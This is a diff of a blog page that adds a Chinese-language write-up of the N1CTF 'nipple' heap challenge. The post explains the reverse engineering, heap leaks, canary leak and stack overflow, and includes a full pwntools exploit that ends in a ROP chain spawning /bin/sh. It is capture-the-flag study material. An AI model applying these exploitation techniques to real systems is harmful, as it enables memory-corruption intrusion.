@@ -138,13 +138,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -187,6 +187,97 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="no_t1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="No_t1me's blog">
+      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | No_t1me's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">N1ctf中nipple题目复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-03 14:42:17 / 修改时间：16:18:38" itemprop="dateCreated datePublished" datetime="2025-11-03T14:42:17+08:00">2025-11-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>跟着共享文档中师傅写的wp复现了一遍nipple（这是整个比赛中我唯一有能力复现的题目</p>
+<p>题目乍看是一道比较经典的菜单题<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" alt="截屏2025-11-03 14.45.50"></p>
+<p>然而初步逆向时却发现还是挺复杂的，特别是一些输出以及读入逻辑：简单来说对于某些特定的内容程序会用一个函数存入<code>(void *)operator new[]((unsigned __int64)v4);</code>动态内存中，然而对于存取也进行了一系列的操作：<strong>他会申请（原始大小*2+2）字节的chunk并将原始data中每个字节的低4位作为单独一字节的低4位同时保留原先动态内存中该字节高4位的值，高4位作为下一个字节的第四位的值保留原先高四位</strong></p>
+<p>这里举一个例子：</p>
+<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" alt="截屏2025-11-03 14.55.52"></p>
+<p>经过函数加工存储为:</p>
+<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p>堆块中存储信息也是这个形式，特别注意在4.Repack功能中，对于堆块的修改也是遵循上述的规定进行写入。</p>
+<blockquote>
+<p>这个读写逻辑的静态逆向比较难，个人感觉在要做题中需要多进行动态调试，通过动调并选择正确的关注点往往能够更快的弄懂程序的逻辑</p>
+</blockquote>
+<p>程序中还有许多第一次接触到的新知识：<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png">这里在菜单循环前new了一个0x1000大小的堆块，并将栈变量指向它。这是一个<strong>预分配的内存池</strong>，栈上存在0x10的变量分别存其基址以及游标(代表内存池的使用情况)。其实内存池与我之前接触的大部分堆题中的bss段存堆信息的作用是一样的。将这些信息存在动态内存中更加灵活，实现可拓展性。当然，如果我们能够通过构造堆overlapping或者堆溢出能控制这个内存池中的数据那么就达成了任意地址读写了。这里的内存池存在extend函数，总体逻辑就是如果游标以及到堆块的尾部的话就申请2倍自己大小复制原先内容然后free掉自己。这也一定程度上允许我们控制对应堆块的相对位置(本题没有用到)。</p>
+<p>关注new功能：发现首先new的chunk没有正确初始化堆块数据便利用parse函数到新chunk中，从而造成libc与heap泄露。</p>
+<p>再关注repack功能，发现读取长度可以自己选定一个不大于于chunk的size的值进行读入，这样输入大size加少数据，就能把栈中数据带出来。同时因为将数据parse进堆时同样逻辑，会造成堆溢出，通过repack在内存池地址旁的chunk溢出修改堆指针就能实现泄露cannary。getline可以实现栈溢出，修复指针(函数结尾会根据其free资源)打ROP即可。</p>
+<blockquote>
+<p>由于读入getline存在\x00截断所以无法直接泄露存储在chunk中的堆数据，一开始通过堆溢出想去覆盖对应chunk的0x18位置，但是因为getline输入仍然存在\x00截断，有点蠢。。。。</p>
+<p>同时对于修改指针存在各种限制:首先写入的数据覆盖只能覆盖每个字节的低4位，因此直接覆盖到存在cannry_chunk+0x19的位置行不通(高4位不同)，通过该低4位为1刚好能够错开cnnary中\x00字节让它分散到两个字节中，也就没有\x00了能够正常带出来cannary。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png">输出逻辑的判断是对于每两字节判断是否同时为0作为输出结束标识。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png"></p>
+</blockquote>
+<p>poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt=<span class="string">b&#x27;Choice: &#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(prompt, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">staylower</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 或者返回 b&#x27;\x00&#x27; 如果你需要处理0</span></span><br><span class="line">    </span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    iterator = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取低4位</span></span><br><span class="line">    temp = data</span><br><span class="line">    <span class="keyword">while</span> temp != <span class="number">0</span>:</span><br><span class="line">        iterator.append(temp &amp; <span class="number">0xf</span>)</span><br><span class="line">        temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组合字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iterator) // <span class="number">2</span>):</span><br><span class="line">        a = iterator[<span class="number">2</span> * i]</span><br><span class="line">        b = iterator[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        result = (a &lt;&lt; <span class="number">4</span>) + b</span><br><span class="line">        ret += <span class="built_in">bytes</span>([result])  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">add(<span class="number">0x3b</span>) <span class="comment">#改堆块存cannary</span></span><br><span class="line"><span class="comment">#泄露libc与heap地址</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">pop_rdi=libc.address+<span class="number">0x10f75b</span></span><br><span class="line">ret=libc.address+<span class="number">0x2a875</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x23</span>)<span class="comment">#改堆块在内存池之前，用来溢出覆盖堆块指针</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=(leak_heap&lt;&lt;<span class="number">12</span>)+<span class="number">0x601</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak cnnary</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#改指针➕泄露</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recv(<span class="number">0x17</span>)</span><br><span class="line">out_put=p.recv(<span class="number">9</span>).<span class="built_in">hex</span>().lstrip(<span class="string">&#x27;0x&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">cannary=u64(<span class="built_in">bytes</span>.fromhex(out_put))</span><br><span class="line">log.success(out_put)</span><br><span class="line">log.success(<span class="built_in">hex</span>(cannary))</span><br><span class="line"><span class="comment">#修复指针</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target-<span class="number">1</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#栈溢出ROP</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,cyclic(<span class="number">0x18</span>)+p64(cannary)+cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))+p64(ret)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment">#触发ret</span></span><br><span class="line">cmd(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结收获"><a href="#总结收获" class="headerlink" title="总结收获"></a>总结收获</h2><p>总的来说题目的利用手法并不是很难，堆溢出泄露数据➕栈溢出。但是题目的逆向量相对较大，对于堆的开辟以及释放过程比较绕，数据写入读取逻辑需要细心逆向。对于ida一打开感觉很难从头逆到尾的程序可以先gdb动态调试一下，关注堆块以及数据的变化再结合静态逆向食用效果更佳！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
